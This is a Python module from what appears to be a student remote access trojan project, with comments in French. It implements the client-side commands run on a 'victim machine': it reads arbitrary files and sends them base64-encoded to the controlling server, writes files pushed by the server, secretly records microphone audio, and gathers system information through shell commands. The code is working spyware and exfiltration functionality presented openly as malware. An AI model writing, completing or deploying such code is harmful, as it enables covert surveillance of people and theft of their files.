"""
Actions exécutées sur la machine victime (client RAT).

Chaque fonction correspond à une commande disponible dans le RAT.
Ce fichier est importé par client_app.py qui route les commandes
reçues du serveur vers la bonne fonction.

Compatibilité : Windows et Linux.
"""

import base64
import io
import platform
import wave
from pathlib import Path

import sounddevice

from rat_project.utils.logger_config import setup_logger

logger = setup_logger("client.actions")


# ---------------------------------------------------------------------------
# Helpers internes
# ---------------------------------------------------------------------------


def _get_os() -> str:
    """Retourne le nom du système d'exploitation ('Windows' ou 'Linux')."""
    return platform.system()


# ---------------------------------------------------------------------------
# download — envoi d'un fichier de la victime vers le serveur
# ---------------------------------------------------------------------------


def handle_download(remote_path: str) -> dict:
    """
    Lit un fichier sur la machine victime et l'encode en base64
    pour l'envoyer au serveur.

    Le serveur a demandé ce fichier via la commande 'download <path>'.
    Le contenu est encodé en base64 car le protocole est JSON (texte).

    Args:
        remote_path: Chemin absolu ou relatif du fichier sur la victime.

    Returns:
        dict: Réponse avec le contenu encodé en base64, ou une erreur.
    """
    path = Path(remote_path)

    # Vérification que le fichier existe
    if not path.exists():
        logger.warning("Download demandé mais fichier introuvable : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Fichier introuvable : {remote_path}",
        }

    # Vérification que c'est bien un fichier (pas un dossier)
    if not path.is_file():
        logger.warning("Download demandé mais le chemin n'est pas un fichier : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Le chemin n'est pas un fichier : {remote_path}",
        }

    try:
        # Lecture binaire + encodage base64 pour passer dans le JSON
        file_bytes = path.read_bytes()
        encoded = base64.b64encode(file_bytes).decode("utf-8")

        logger.info("Download : %s (%s octets)", remote_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "download",
            "filename": path.name,
            "data": encoded,
            "output": f"Fichier envoyé : {path.name} ({len(file_bytes)} octets)",
        }

    except PermissionError:
        logger.warning("Download refusé (permissions) : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Permission refusée : {remote_path}",
        }

    except Exception as exc:
        logger.exception("Erreur lors du download de %s : %s", remote_path, exc)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# upload — réception d'un fichier envoyé par le serveur
# ---------------------------------------------------------------------------


def handle_upload(message: dict) -> dict:
    """
    Reçoit un fichier envoyé par le serveur et l'écrit sur la victime.

    Le serveur a encodé le fichier en base64 dans le message.
    On le décode et on l'écrit dans le répertoire courant de l'agent.

    Args:
        message: Message du serveur contenant 'filename' et 'data' (base64).

    Returns:
        dict: Confirmation d'écriture ou message d'erreur.
    """
    filename = message.get("filename", "uploaded_file")
    encoded_data = message.get("data", "")

    if not encoded_data:
        logger.warning("Upload reçu mais aucune donnée dans le message")
        return {
            "type": "command_result",
            "command": "upload",
            "error": "Aucune donnée reçue.",
        }

    try:
        # Décodage base64 → bytes → écriture sur disque
        file_bytes = base64.b64decode(encoded_data)
        save_path = Path(filename)
        save_path.write_bytes(file_bytes)

        logger.info("Upload reçu et sauvegardé : %s (%s octets)", save_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "upload",
            "output": f"Fichier reçu et sauvegardé : {save_path} ({len(file_bytes)} octets)",
        }

    except Exception as exc:
        logger.exception("Erreur lors de l'upload de %s : %s", filename, exc)
        return {
            "type": "command_result",
            "command": "upload",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# Fonctions à implémenter dans les prochaines étapes
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# record_audio — record microphone audio and return it as a base64 WAV string
# ---------------------------------------------------------------------------

AUDIO_SAMPLE_RATE = 44100  # Hz (CD quality)
AUDIO_CHANNELS = 1  # mono


def record_audio(duration: int = 5) -> str:
    """
    Record audio from the client microphone and return it as a base64 WAV string.

    Uses sounddevice to capture PCM int16 audio, then wraps it in a WAV
    container (stdlib wave module) and encodes it in base64 for JSON transport.

    Args:
        duration: Recording duration in seconds (default: 5).

    Returns:
        str: Base64-encoded WAV audio data.
    """
    logger.info("Recording audio for %s second(s)...", duration)

    # 1. Record from the default microphone as 16-bit PCM
    frames = sounddevice.rec(
        int(duration * AUDIO_SAMPLE_RATE),
        samplerate=AUDIO_SAMPLE_RATE,
        channels=AUDIO_CHANNELS,
        dtype="int16",
    )
    sounddevice.wait()  # block until recording is complete

    logger.info("Recording finished (%s frames captured)", len(frames))

    # 2. Write numpy array into an in-memory WAV container (no temp file)
    wav_buffer = io.BytesIO()
    with wave.open(wav_buffer, "wb") as wav_file:
        wav_file.setnchannels(AUDIO_CHANNELS)
        wav_file.setsampwidth(2)  # 2 bytes = 16 bits per sample
        wav_file.setframerate(AUDIO_SAMPLE_RATE)
        wav_file.writeframes(frames.tobytes())

    # 3. Encode to base64 so it can travel as a JSON string
    return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")


def get_system_info() -> str:
    """Retourne les informations système (sysinfo)."""
    import locale
    import subprocess

    system_name = _get_os()
    command = "systeminfo" if system_name == "Windows" else "uname -a"
    encoding = "cp850" if system_name == "Windows" else locale.getpreferredencoding(False)

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"
